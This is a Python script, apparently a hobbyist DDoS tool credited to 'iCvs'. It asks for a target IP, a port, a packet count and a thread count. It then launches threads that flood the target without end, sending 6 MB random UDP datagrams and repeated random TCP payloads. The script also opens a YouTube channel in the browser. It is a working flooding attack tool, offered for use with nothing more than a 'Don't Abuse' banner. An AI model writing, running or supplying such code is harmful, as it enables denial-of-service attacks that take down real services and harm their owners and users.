import random
import socket
import threading
import time
import os,sys

os.system('clear')

print("\033[91m")
print('''
██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░''')
print("DDOS-ATTACK")
print("ENTER DDOS-ATTACK")

test = input()
if test == "D":
  exit(5)
  
os.system('clear')
print("\033[91m")
print("============⚠WARNING⚠︎============")
print("Loading 1 Seconds....")
print("============⚠WARNING⚠︎============")
time.sleep(1)
os.system("clear")
os.system("xdg-open https://youtube.com/channel/UC2mLQ18pngyrc7Rs3ElnpQw")
print("\033[1;32m√ \033[1;37mDon't Abuse \033[1;36m>_<")
time.sleep(10)
os.system('clear')
print("\033[91m")
print("Tools by iCvs | FLOOD |")
print("\033[91m")

ip = str(input("Target Host/Ip: "))
port = int(input("Target Port: "))
choice = str(input("iCvs?(y/n): "))
times = int(input("Packets: "))
threads = int(input("Threads: "))
print("Loading,,")
time.sleep(5)

os.system('clear')
def LnskyDdos():
        data = random._urandom(6000000)
        i = random.choice(("\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(i +"\033[91mIP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        print("\033[91m[Flood] Attacking =>!!!")

def LnskyDdos2():
        data = random._urandom(20179)
        i = random.choice(("\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mIP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[FLood] Attack by iCvs!!")

def LnskyDdos3():
        data = random._urandom(20179)
        i = random.choice(("\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> ","\033[93m[•] (ATTACK) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mIP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[FLOOD] Attack by iCvs!")


def LnskyDdos4():
        data = random._urandom(20179)
        i = random.choice(("\033[93m[•] (ATTACK) ===> ","\033[93m[•] (FLOOD) ===> ","\033[93m[•] (flood) ===> "))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(i +"\033[91mIP \033[0m%s \033[91mPORT \033[0m%s"%(ip, port))
                except:
                        s.close()
                        print("\033[91m[ATTACK]Tools by iCvs!!!")

for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = LnskyDdos)
                th.start()
                th = threading.Thread(target = LnskyDdos2)
                th.start()
                th = threading.Thread(target = LnskyDdos3)
                th.start()
        else:
                th = threading.Thread(target = LnskyDdos4)
                th.start()
